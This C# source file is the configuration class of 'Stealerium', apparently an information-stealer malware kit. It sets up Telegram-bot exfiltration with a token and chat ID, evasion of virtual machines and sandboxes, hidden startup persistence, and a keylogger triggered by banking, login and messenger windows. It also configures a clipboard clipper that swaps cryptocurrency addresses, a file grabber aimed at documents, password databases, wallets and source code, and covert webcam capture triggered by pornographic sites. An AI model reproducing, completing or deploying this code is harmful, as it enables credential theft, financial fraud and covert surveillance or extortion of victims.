using System.Collections.Generic;
using Stealerium.Stub.Modules.Implant;

namespace Stealerium.Stub
{
    public static class Config
    {
        public static string Version = "v3.5.2";

#if DEBUG
        // Telegram bot API key
        public static string TelegramAPI = "816786760:AAEuascASCwq54ZqfAxe9vcsg";
        // Telegram chat ID
        public static string TelegramID = "19978214749";

        // Debug mode (write all exceptions to file)
        public static string DebugMode = "1";

        // Application mutex (random)
        public static string Mutex = "wef5wef1";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "0";

        // Drop and Hide executable to startup directory
        public static string Autorun = "1";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "0";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "0";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "1";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "0";

        // File grabber:
        public static string GrabberModule = "1";
#elif RELEASE
        // Telegram bot API key
        public static string TelegramAPI = "--- TelegramAPI ---";
        // Telegram chat ID
        public static string TelegramID = "--- TelegramID ---";

        // Debug mode (write all exceptions to file)
        public static string DebugMode = "--- Debug ---";

        // Application mutex (random)
        public static string Mutex = "--- Mutex ---";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "--- AntiAnalysis ---";

        // Drop and Hide executable to startup directory
        public static string Autorun = "--- Startup ---";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "--- StartDelay ---";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "--- WebcamScreenshot ---";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "--- Keylogger ---";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "--- Clipper ---";

        // File grabber:
        public static string GrabberModule = "--- Grabber ---";
#endif
        // Clipper addresses:
        public static Dictionary<string, string> ClipperAddresses =
            new Dictionary<string, string>
            {
                { "btc", "--- ClipperBTC ---" }, // Bitcoin
                { "eth", "--- ClipperETH ---" }, // Ethereum
                { "ltc", "--- ClipperLTC ---" } // Litecoin
            };

        // Start keylogger when active window title contains this text:
        public static string[] KeyloggerServices =
        {
            "facebook", "twitter",
            "chat", "telegram", "skype", "discord", "viber", "message",
            "gmail", "protonmail", "outlook",
            "password", "encryption", "account", "login", "key", "sign in",
            "bank", "credit", "card",
            "shop", "buy", "sell"
        };

        public static string[] BankingServices =
        {
            "qiwi", "money", "exchange",
            "bank", "credit", "card", "paypal"
        };

        // Start clipper when active window title contains this text:
        public static string[] CryptoServices =
        {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "wallet", "coinomi", "coinbase"
        };

        // Start webcam capture when active window title contains this text:
        public static string[] PornServices =
        {
            "porn", "sex", "hentai", "chaturbate"
        };

        // Maximum file size (5 MB)
        public static int GrabberSizeLimit = 5 * 1024 * 1024; // 5,242,880 bytes

        // Grabber file types:
        public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
        {
            ["Document"] = new[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" },
            ["DataBase"] = new[]
                { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
            ["SourceCode"] = new[]
            {
                "c", "cs", "sln", "csproj", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
                "java", "kt", "kts", "ino"
            },
            ["Image"] = new[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
        };

        // Decrypt config values
        public static void Init()
        {
            // Decrypt telegram token and telegram chat id
            TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
            TelegramID = StringsCrypt.DecryptConfig(TelegramID);

            if (ClipperModule != "1") return;
            ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
            ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
            ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
        }
    }
}